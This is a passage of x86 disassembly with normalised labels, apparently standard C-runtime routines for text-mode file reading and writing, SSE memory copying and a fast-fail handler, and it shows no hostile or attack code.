push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
cmp edi [ ebp - 0x1c ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edx * 4 + rw-data ]
add edi 0x2
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0xa
pop edx
cmp [ edi + 0x2 ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
add esi 0x2
add edi 0x2
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov [ esi ] ax
add esi 0x2
push 0xd
pop eax
push eax
pop edi
movzx eax [ esi ]
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
sub esi edi
push esi
push edi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
mov edi eax
jmp r-xdata
push 0xa
pop eax
add edi 0x2
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
cmp al 0x1a
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cx
push 0xa
pop eax
add edi 0x4
mov [ esi ] ax
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_410eb4
mov [ eax ] 0x2a
jmp r-xdata
mov ebx [ ebp - 0x24 ]
cmp esi ebx
jb r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov eax [ eax * 4 + rw-data ]
cmp edi esi
setne cl
add edi edi
mov [ eax + ebx + 0x30 ] ecx
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cl
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cx
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
add esi 0x2
jmp r-xdata
movzx eax [ edi ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
dec esi
inc edx
movzx eax [ esi ]
cmp [ eax + rw-data ] 0x0
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x1 ] al
jne r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x8 ] ax
jne r-xdata
neg edx
mov eax edx
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_413f47
add esp 0x10
mov al [ esi ]
inc esi
mov [ ecx + ebx + 0x5 ] al
mov eax [ ebp - 0xc ]
cmp edx 0x2
jl r-xdata
cmp edx 0x4
jg r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_413f47
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
jne r-xdata
mov [ esi ] 0xd
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x1 ]
inc esi
mov [ ecx + ebx + 0x5 ] al
jmp r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_413f47
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
jne r-xdata
pop eax
mov [ esi ] ax
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x8 ]
mov [ ecx + ebx + 0x5 ] al
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x7 ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ edx * 4 + rw-data ]
push 0xa
pop ecx
add esi 0x2
mov [ eax + ebx + 0x26 ] cl
mov [ esi ] ax
add esi 0x2
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ ebp - 0xc ]
inc esi
push 0xd
push 0xd
pop ecx
mov [ esi ] cl
mov [ esi ] al
inc esi
pop ecx
push 0xd
push 0xd
pop ecx
mov [ esi ] cx
mov [ esi ] ax
add esi 0x2
jmp r-xdata
pop ecx
sub esi edx
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x26 ] al
inc esi
sub_412bb6
call sub_415a1d
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_415a46
pop ecx
push 0x3
call sub_411113
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_411643
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_412c10
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_4130e4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_412fe8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4130e4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_412e5c ]
jmp [ ecx * 4 + jump_table_412edc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412f48 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4130e4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_412f48 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4130e4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4130e4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4130e4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412f48 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_412f48 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_413254
push 0x10
push r--data
call sub_411a70
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_417802
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_413336
add esp 0xc
mov edi eax
jmp r-xdata
call sub_411ab5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41330d
mov eax edi
jmp r-xdata
sub_413336
push ebp
mov ebp esp
mov eax 0x1af0
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_410e80
and [ eax ] edi
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40f682
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_410e80
and [ eax ] edi
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_417047
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_413f47
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_414adf
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_410eb4
mov [ eax ] 0x1c
call sub_410e80
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_410e93
pop ecx
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_417463
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_417d18
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_417567
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_417567
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_417d18
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
